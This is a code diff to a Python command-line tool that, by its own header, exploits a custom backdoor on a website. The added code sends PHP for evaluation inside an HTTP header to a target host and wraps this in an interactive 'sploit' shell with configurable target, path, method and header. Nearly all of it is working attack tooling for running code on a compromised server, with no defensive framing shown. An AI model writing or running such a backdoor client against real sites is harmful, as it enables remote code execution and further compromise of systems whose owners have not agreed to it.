@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 # @brief This python script will exploit a custom backdoor placed in on a
 #       website endpoint.
-import os
-import traceback
+import os  # system calls
+import traceback  # Exception stack trace
+import requests  # HTTP requests
+import readline  # command history and other features
 
 # @brief Exception raised to exit program.
 class ExitException(Exception):
@@ -17,8 +19,83 @@ class CommandException(Exception):
         it to be sent to the backdoored server.
 """
 class ExploitProcessor():
-    def __init__(self):
+    """
+    @brief Construct an ExploitProcessor.
+    @param host the hostname of the backdoored server.
+    @param path the path of the backdoored resource.
+    @param method the HTTP method to access the backdoor with.
+    @param header the HTTP header containing the backdoor.
+    @pre \p host is a valid backdoored host.
+    @pre \p path is the path to a valid backdoored resource.
+    @pre \p method is allowed by the target.
+    @pre \p header corresponds to the server side backdoor.
+    @throw CommandException if the connection fails.
+    """
+    def __init__(self, host: str, path: str, method: str, header: str):
+        self.socket = None
         self.directory = ""
+        self.__make_connection(host, path, method, header)
+
+    """
+    @brief method to start a connection with the backdoored resource.
+    @param host the hostname of the backdoored server.
+    @param path the path of the backdoored resource.
+    @param method the HTTP method to access the backdoor with.
+    @param header the HTTP header containing the backdoor.
+    @pre \p host is a valid backdoored host.
+    @pre \p path is the path to a valid backdoored resource.
+    @pre \p method is allowed by the target.
+    @pre \p header corresponds to the server side backdoor.
+    @throw CommandException if the connection fails.
+    """
+    def __make_connection(self,
+                          host: str,
+                          path: str,
+                          method: str,
+                          header: str):
+        try:
+            self.__send_message(host, path, method, header,
+                                f"header('{header}: ' . phpversion()); exit;")
+        except:
+            raise CommandException(f"Unable to exploit host. Make sure the "
+                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, and"
+                                   f" METHOD are correct.")
+    
+    """
+    @brief method to start a connection with the backdoored resource.
+    @param host the hostname of the backdoored server.
+    @param path the path of the backdoored resource.
+    @param method the HTTP method to access the backdoor with.
+    @param header the HTTP header containing the backdoor.
+    @param message the message to be sent to the backdoor.
+    @pre \p host is a valid backdoored host.
+    @pre \p path is the path to a valid backdoored resource.
+    @pre \p method is allowed by the target.
+    @pre \p header corresponds to the server side backdoor.
+    @pre \p message is proper and can be evaluated.
+    @throw CommandException if the server doesn't respond with success.
+    """
+    def __send_message(self,
+                        host: str,
+                        path: str,
+                        method: str,
+                        header: str,
+                        message: str):
+        url = f"{host}{path}"
+        if not host.startswith("http"):
+            url = "http://" + url
+        try:
+            response = requests.request(
+                method,
+                url,
+                headers={ f"{header}": message }
+            )
+            if not response.ok:
+                raise Exception()
+            print("Successfully exploited", response.headers[header])
+        except:
+            raise CommandException(f"Unable to send messages to server.")
+
 
 """
 @brief The CommandProcessor class accepts commands passed into it and processes
@@ -55,14 +132,14 @@ class CommandProcessor():
 
         # exploit variables
         self.variables = {
-            "TARGET": {"value": "", "required": True},
-            "TARGET_TYPE": {"value": "ASP", "required": True},
+            "TARGET_HOST": {"value": "", "required": True},
+            "TARGET_PATH": {"value": "/", "required": True},
+            "TARGET_TYPE": {"value": "PHP", "required": True},
             "METHOD": {"value": "GET", "required": True},
             "HEADER": {"value": "EXPLOIT", "required": True}
         }
 
-        # have we successfully exploited yet?
-        self.post = False
+        self.exploit = None
 
     """
     @brief Help command that prints commands and their usage.
@@ -76,7 +153,8 @@ class CommandProcessor():
                        f" {self.commands[command]['description']}"))
         else:  # look up specific command
             if options in self.commands:
-                print(f"    {options}: {self.commands[options]['description']}")
+                print((f"    "
+                      f"{options}: {self.commands[options]['description']}"))
             else:  # command does not exist
                 raise CommandException(f"    '{options}' command not found.")
 
@@ -86,10 +164,9 @@ class CommandProcessor():
     @param options Not used.
     """
     def __exit(self, options: str):
-        if self.post:
+        if self.exploit:
             # exit shell
-            self.post = False
-            print("Exiting exploit shell.")
+            self.exploit = None
         else:
             # exit program
             raise ExitException()
@@ -97,23 +174,30 @@ class CommandProcessor():
     """
     @brief Command to clear the screen.
     @param options Not used.
-    @pre the TARGET and TARGET_TYPE exploit variables have been set.
+    @pre the required exploit variables have been set.
     @throw CommandException if the pre-condition is not met.
     """
     def __exploit(self, options: str):
+        if self.exploit_status() == True:
+            raise CommandException("Already exploited target.")
         for var in self.variables:
             if (self.variables[var]["required"] and
                 len(self.variables[var]["value"]) == 0):
                 raise CommandException(f"{var} not set.")
-        print((f"Attempting to exploit {self.variables['TARGET']['value']} using "
-              f"{self.variables['TARGET_TYPE']['value']}"))
+        print((f"Attempting to exploit "
+               f"{self.variables['TARGET_HOST']['value']} "
+               f"at {self.variables['TARGET_PATH']['value']}"))
         
-        self.post = True
+        self.exploit = (
+            ExploitProcessor(self.variables['TARGET_HOST']['value'],
+                             self.variables['TARGET_PATH']['value'],
+                             self.variables['METHOD']['value'],
+                             self.variables['HEADER']['value']))
 
     """
     @brief Command to set exploit variables.
     @param the variable to be set and the value, if any.
-    @throw CommandException if the variable does not exist, or if the vlaue is
+    @throw CommandException if the variable does not exist, or if the value is
             invalid.
     """
     def __clear(self, options: str):
@@ -174,8 +258,8 @@ class CommandProcessor():
     @brief Getter for exploit status (True or False)
     @return bool for if we are in the exploit shell.
     """
-    def expliot_status(self):
-        return self.post
+    def exploit_status(self):
+        return self.exploit is not None
 
 if __name__ == "__main__":
     processor = CommandProcessor()
@@ -184,7 +268,7 @@ if __name__ == "__main__":
         print("For help, type 'help'")
         while (True):
             pre = " > "
-            if processor.expliot_status():
+            if processor.exploit_status():
                 pre = "sploit > "
             command = input(pre)
             try:
